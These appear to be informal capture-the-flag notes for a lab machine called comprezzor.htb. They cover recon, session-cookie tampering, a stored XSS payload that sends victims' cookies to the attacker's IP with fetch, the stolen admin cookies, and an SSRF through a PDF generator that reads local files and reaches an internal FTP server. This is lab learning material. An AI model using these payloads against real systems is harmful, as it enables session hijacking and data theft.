## Linux Machine


## Recon 

[+] + Port 22,80

## Foothold

[+] + In comprezzor.htb code source -> report.comprezzor.htb

[+] + in order to report a bug you have to be authentified 

[+] + redirection to auth.comprezzor.htb 

[+] + after registration login with account

```base64  eyJ1c2VyX2lkIjogNiwgInVzZXJuYW1lIjogInRyeXRoaXNvbmUiLCAicm9sZSI6ICJ1c2VyIn18MDFiMDBiYWFlODhjMTk4ZWE4NTc4Nzc4MWJjN2U3NDc1NDAzMGFiMmJhNjVjZmRkNDUxODIwN2U1ZmE5MjZmNw==
```

[+] + base64 decoded :
```{"user_id": 6, "username": "trythisone", "role": "user"}|01b00baae88c198ea85787781bc7e74754030ab2ba65cfdd4518207e5fa926f7
```

[+] + ffuf -> http://dashboard.comprezzor.htb/ 
	      http://auth.comprezzor.htb/
	      http://report.comprezzor.htb

		{"user_id": 6, "username": "trythisone", "role": "admin"}|01b00baae88c198ea85787781bc7e74754030ab2ba65cfdd4518207e5fa926f7
		e3VzZXJfaWQ6IDYsIHVzZXJuYW1lOiB0cnl0aGlzb25lLCByb2xlOiBhZG1pbn18MDFiMDBiYWFlODhjMTk4ZWE4NTc4Nzc4MWJjN2U3NDc1NDAzMGFiMmJhNjVjZmRkNDUxODIwN2U1ZmE5MjZmNwo==

		{"_flashes":[{" t":["success","Logged in successfully!"]}]{"role": "admin"}}

		eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIkxvZ2dlZCBpbiBzdWNjZXNzZnVsbHkhIl19XXsicm9sZSI6ICJhZG1pbiJ9fQo=

[1] + XSS in report form : 

[+] + Payload :<img src=x onerror=fetch("http://10.10.14.39:8000/c="+document.cookie);>
[+] + Stolen cookie : eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4

[1] + Dirbusting with cookies shows:
      >> /resolve   Post method only Internal server error 
      >> /backup    Get Method only  Redirect to /

[2] + I can set report to high priority , maybe I have to sneak an xss img that load in description only for admin  ## Doesn't work at first figured I had to restart machine again
      
[+] + Stolen cookie : eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRhZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5

[2] + Being admin gets access to http://dashboard.comprezzor.htb/create_pdf_report
	I can dowload a file from my attacker machine and it transforms it to pdf , I can maybe download internal files and display output in pdf 

[2] + SSRF 
[+] + Payload : file://proc/self/cmdline >> python3/app/code/app.py

so im in python maybe python reverse shell could do it 

after circulating in /proc/self I found /app/setup.sh in /proc/self/mount 

		#!/bin/sh apt update apt-get -y install wkhtmltopdf echo "172.21.0.1 ftp.local" >> /etc/hosts pip3 install --no-cache-dir -r
		requirements.txt python3 /app/code/app.py

seems like this script bash installs wkhtmltopdf and add in ftp.local 

Found this exploit of wkhtmltopdf online : https://exploit-notes.hdks.org/exploit/web/security-risk/wkhtmltopdf-ssrf/ 

/etc/hostname : web.local

/etc/hosts : 			
		127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-
		allnodes ff02::2 ip6-allrouters 172.21.0.2 web.local web 172.21.0.1 ftp.local
		
		
so theres an ftp here 

And since Im web.local that means im 172.21.0.2 , maybe I gotta go to 172.21.0.1 specially because I believe im in docker in /etc/passwd


SSRF primitive once more to gain access to the FTP server within the machine
use welcome_note.txt and id_rsa to leak user acc using the ssh-keygen -p -f trick

 
